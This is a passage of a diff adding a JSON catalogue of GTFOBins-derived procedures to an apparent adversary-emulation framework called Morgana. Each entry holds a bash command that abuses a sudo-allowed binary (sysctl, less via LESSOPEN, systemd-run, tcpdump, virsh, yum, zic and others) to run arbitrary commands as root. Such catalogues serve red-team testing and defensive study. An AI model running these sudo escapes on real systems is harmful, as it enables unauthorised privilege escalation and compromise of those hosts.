+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:sshfs:command:0:sudo::",
+        "source_name": "sshfs",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `sshfs` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:sysctl:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - sysctl - Command - Sudo [9fbc47f]",
+      "description": "This executable can run non-interactive system commands. Binary: sysctl. Context: Sudo. The command is executed by `root` in the background when a core dump occurs. To trigger a core dump, send the `SIGQUIT` signal to a process, for example: ``` sleep infinity & kill -QUIT $! ```",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "sysctl 'kernel.core_pattern=|/path/to/command'",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/sysctl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/sysctl",
+        "source_bin": "sysctl",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:sysctl:command:0:sudo::",
+        "source_name": "sysctl",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `sysctl` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:systemctl:command:1:sudo:0:systemctl>less",
+      "name": "GTFOBINS - T1059 - systemctl - Command - Sudo [fcb23aa]",
+      "description": "This executable can run non-interactive system commands. Binary: systemctl. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "systemctl\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/systemctl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/systemctl",
+        "source_bin": "systemctl",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "systemctl",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "systemctl",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:systemctl:command:1:sudo:0:systemctl>less",
+        "source_name": "systemctl",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `systemctl` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:systemd-resolve:command:1:sudo:0:systemd-resolve>less",
+      "name": "GTFOBINS - T1059 - systemd-resolve - Command - Sudo [94ac163]",
+      "description": "This executable can run non-interactive system commands. Binary: systemd-resolve. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "systemd-resolve --status\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/systemd-resolve",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/systemd-resolve",
+        "source_bin": "systemd-resolve",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "systemd-resolve",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "systemd-resolve",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:systemd-resolve:command:1:sudo:0:systemd-resolve>less",
+        "source_name": "systemd-resolve",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `systemd-resolve` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:systemd-run:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - systemd-run - Command - Sudo [4574f15]",
+      "description": "This executable can run non-interactive system commands. Binary: systemd-run. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "systemd-run /path/to/command",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/systemd-run",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/systemd-run",
+        "source_bin": "systemd-run",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "blind": true
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:systemd-run:command:0:sudo::",
+        "source_name": "systemd-run",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `systemd-run` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:tcpdump:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - tcpdump - Command - Sudo [4d2c211]",
+      "description": "This executable can run non-interactive system commands. Binary: tcpdump. Context: Sudo. This requires some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo /path/to/command >#{lotl_gtfobins_local_path}\nchmod +x #{lotl_gtfobins_local_path}\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z #{lotl_gtfobins_local_path} -Z root",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/tcpdump",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/tcpdump",
+        "source_bin": "tcpdump",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {
+          "code": "echo /path/to/command >/path/to/temp-file\nchmod +x /path/to/temp-file\ntcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root"
+        },
+        "procedure_metadata": {
+          "version": "In recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following."
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:tcpdump:command:0:sudo::",
+        "source_name": "tcpdump",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `tcpdump` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:tcpdump:command:1:sudo::",
+      "name": "GTFOBINS - T1059 - tcpdump - Command - Sudo [59590fd]",
+      "description": "This executable can run non-interactive system commands. Binary: tcpdump. Context: Sudo. This require some traffic to be actually captured. Also note that the `command-argument` string is both passed to the command and written as file, hence some restrictions apply.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "tcpdump -ln -i lo -w 'command-argument' -W 1 -G 1 -z /path/to/command",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/tcpdump",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/tcpdump",
+        "source_bin": "tcpdump",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:tcpdump:command:1:sudo::",
+        "source_name": "tcpdump",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `tcpdump` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:timedatectl:command:1:sudo:0:timedatectl>less",
+      "name": "GTFOBINS - T1059 - timedatectl - Command - Sudo [061b094]",
+      "description": "This executable can run non-interactive system commands. Binary: timedatectl. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "timedatectl list-timezones\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/timedatectl",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/timedatectl",
+        "source_bin": "timedatectl",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "timedatectl",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "timedatectl",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:timedatectl:command:1:sudo:0:timedatectl>less",
+        "source_name": "timedatectl",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `timedatectl` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:virsh:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - virsh - Command - Sudo [1776e6f]",
+      "description": "This executable can run non-interactive system commands. Binary: virsh. Context: Sudo.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "cat >#{lotl_gtfobins_local_path}.xml <<EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='/path/to/command'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nvirsh -c qemu:///system create #{lotl_gtfobins_local_path}.xml\nvirsh -c qemu:///system destroy x",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/virsh",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/virsh",
+        "source_bin": "virsh",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:virsh:command:0:sudo::",
+        "source_name": "virsh",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `virsh` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:yum:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - yum - Command - Sudo [be2be08]",
+      "description": "This executable can run non-interactive system commands. Binary: yum. Context: Sudo. Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` echo /path/to/command >x.sh fpm -n x -s dir -t rpm -a all --before-install .x.sh . ```",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "yum localinstall -y x-1.0-1.noarch.rpm",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/yum",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/yum",
+        "source_bin": "yum",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:yum:command:0:sudo::",
+        "source_name": "yum",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `yum` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:zic:command:0:sudo::",
+      "name": "GTFOBINS - T1059 - zic - Command - Sudo [d335c0e]",
+      "description": "This executable can run non-interactive system commands. Binary: zic. Context: Sudo. This executes the command twice: - `/path/to/command 0 xxx` - `/path/to/command 1 xxx` Additionally the `Test` file is created.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >#{lotl_gtfobins_local_path}\necho 'Zone Test 2:00 Jordan CE%sT' >>#{lotl_gtfobins_local_path}\nzic -d . -y /path/to/command #{lotl_gtfobins_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/zic",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/zic",
+        "source_bin": "zic",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 0,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": null,
+        "inheritance_path": [],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {},
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:zic:command:0:sudo::",
+        "source_name": "zic",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `zic` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:zless:command:1:sudo:0:zless>less",
+      "name": "GTFOBINS - T1059 - zless - Command - Sudo [653e5a5]",
+      "description": "This executable can run non-interactive system commands. Binary: zless. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "zless #{lotl_gtfobins_input_file}\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_gtfobins_input_file"
+      ],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/zless",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/zless",
+        "source_bin": "zless",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "zless",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "zless",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:zless:command:1:sudo:0:zless>less",
+        "source_name": "zless",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `zless` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    },
+    {
+      "id": "gtfobins:zsh:command:1:sudo:0:zsh>less",
+      "name": "GTFOBINS - T1059 - zsh - Command - Sudo [94de5ea]",
+      "description": "This executable can run non-interactive system commands. Binary: zsh. Context: Sudo. Inherits command behavior from less.",
+      "tactic": "Execution",
+      "tcode": "T1059",
+      "executor": "bash",
+      "platform": "linux",
+      "command": "zsh -c '</etc/hosts'\nLESSOPEN='/path/to/command # %s' less /etc/hosts",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "modify",
+      "source_metadata": {
+        "source_file": "_gtfobins/zsh",
+        "source_documentation": "https://github.com/GTFOBins/GTFOBins.github.io/blob/master/_gtfobins/zsh",
+        "source_bin": "zsh",
+        "function": "command",
+        "function_label": "Command",
+        "snippet_index": 1,
+        "context": "sudo",
+        "context_description": "This function is performed by the privileged user if executed via `sudo` because the acquired privileges are not dropped.",
+        "inherited_from": "less",
+        "inheritance_path": [
+          "zsh",
+          "less"
+        ],
+        "interactive": false,
+        "manual_prerequisite": false,
+        "function_metadata": {
+          "blind": {
+            "true": "The commands are executed but their output is hidden from the attacker."
+          }
+        },
+        "context_metadata": {},
+        "procedure_metadata": {
+          "inherited_from": "less",
+          "inheritance_path": [
+            "zsh",
+            "less"
+          ],
+          "inherit_index": 0
+        },
+        "operator_notes": {},
+        "provider": "gtfobins",
+        "source_id": "gtfobins:zsh:command:1:sudo:0:zsh>less",
+        "source_name": "zsh",
+        "source_tcodes": [
+          "T1059"
+        ],
+        "category": "command",
+        "readiness": "environment_prerequisite",
+        "prerequisites": [
+          "The `zsh` binary must be installed and available to the executing Agent.",
+          "The operator must preconfigure the documented sudo permission; Morgana does not modify sudoers."
+        ]
+      }
+    }
+  ],
+  "chains": []
+}
